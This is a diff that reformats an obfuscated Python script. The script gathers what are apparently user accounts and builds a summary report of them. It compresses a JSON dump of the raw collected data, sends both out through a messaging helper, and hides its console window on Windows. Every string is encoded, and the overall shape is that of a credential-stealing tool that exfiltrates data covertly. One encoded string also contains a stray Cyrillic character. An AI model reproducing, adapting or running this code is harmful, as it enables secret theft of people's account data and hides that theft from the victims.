@@ -210,35 +210,74 @@ def _cmp(d):
 
 def _m():
     try:
-        sc=_C()
-        ac=sc._sa()
+        sc = _C()
+        ac = sc._sa()
         if not ac:
-            sn=_D()
+            sn = _D()
             sn._sm(_d('D##V{h{g#hbbjml#uib{qd'))
             return
-        st=sc._an(ac)
-        sn=_D()
-        sm=f"""{_d('F#THVG#V\\KBZVKAW\\L#HBBJMLT')}\n{_d('F#')}{datetime.now().strftime(_d('CRTRVKR0RV8C#8Z8T'))}\n\n{_d('F#Idtz{zd8')}\n{_d('D#G`qmn`ul{it8')}{st[_d('ubu`y?uib~tlim')]}\n{_d('D#Hbbjmlt8')}{st[_d('ubu`y?hbbjmlt')]}\n{_d('D#Tmuft8')}{st[_d('ubu`y?tmuft')]}\n{_d('D#]b{uybgt8')}{len(st[_d('}{gymh`ult')])}{_d('#tmuft')}\n"""
+
+        st = sc._an(ac)
+        sn = _D()
+
+        header_path = _d('F#THVG#V\\KBZVKAW\\L#HBBJMLT')
+        date_fmt = _d('CRTRVKR0RV8C#8Z8T')
+
+        sm = (
+            f"{header_path}\n"
+            f"{_d('F#')}{datetime.now().strftime(date_fmt)}\n\n"
+            f"{_d('F#Idtz{zd8')}\n"
+            f"{_d('D#G`qmn`ul{it8')}{st[_d('ubu`y?uib~tlim')]}\n"
+            f"{_d('D#Hbbjmlt8')}{st[_d('ubu`y?hbbjmlt')]}\n"
+            f"{_d('D#Tmuft8')}{st[_d('ubu`y?tmuft')]}\n"
+            f"{_d('D#]b{uybgt8')}{len(st[_d('}{gymh`ult')])}{_d('#tmuft')}\n"
+        )
+
         sn._sm(sm)
-        for br,inf in st[_d('ur?uib~tli')].items():
-            msg=f"{_d('F#')}{br.upper()}{_d('8#')}{inf[_d('hb{gu')]}{_d('#hbbjmlt5#')}{inf[_d('tmuft')]}{_d('#tmuft')}"
+
+        for br, inf in st[_d('ur?uib~tli')].items():
+            msg = (
+                f"{_d('F#')}{br.upper()}{_d('8#')}"
+                f"{inf[_d('hb{gu')]}{_d('#hbbjmlt5#')}"
+                f"{inf[_d('tmuft')]}{_d('#tmuft')}"
+            )
             sn._sm(msg)
-        jd=json.dumps({_d('umzltu`zg'):datetime.now().isoformat(),_d('tu`ut'):st,_d('hbbjmlt'):ac},indent=2,ensure_ascii=False)
-        cp=_cmp(jd)
-        fn=f"{_d('hbbjmlt?')}{datetime.now().strftime(_d('CRTRVKR0V8Z8T'))}{_d('Wptbg')}{_d('Wns')}"
-        sn._sf(fn,cp)
+
+        jd = json.dumps(
+            {
+                _d('umzltu`zg'): datetime.now().isoformat(),
+                _d('tu`ut'): st,
+                _d('hbbjmlt'): ac,
+            },
+            indent=2,
+            ensure_ascii=False,
+        )
+
+        cp = _cmp(jd)
+
+        fn = (
+            f"{_d('hbbjmlt?')}"
+            f"{datetime.now().strftime(_d('CRTRVKR0V8Z8T'))}"
+            f"{_d('Wptbg')}{_d('Wns')}"
+        )
+
+        sn._sf(fn, cp)
+
     except Exception as e:
         try:
-            sn=_D()
+            sn = _D()
             sn._sm(f"{_d('C#Liiл{i8#')}{str(e)[:100]}")
         except:
             pass
 
-if __name__==_d('??z`mg??'):
-    if sys.platform==_d('~mo>V'):
+
+if __name__ == _d('??z`mg??'):
+    if sys.platform == _d('~mo>V'):
         try:
             import ctypes
-            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)
+            ctypes.windll.user32.ShowWindow(
+                ctypes.windll.kernel32.GetConsoleWindow(), 0
+            )
         except:
             pass
     _m()
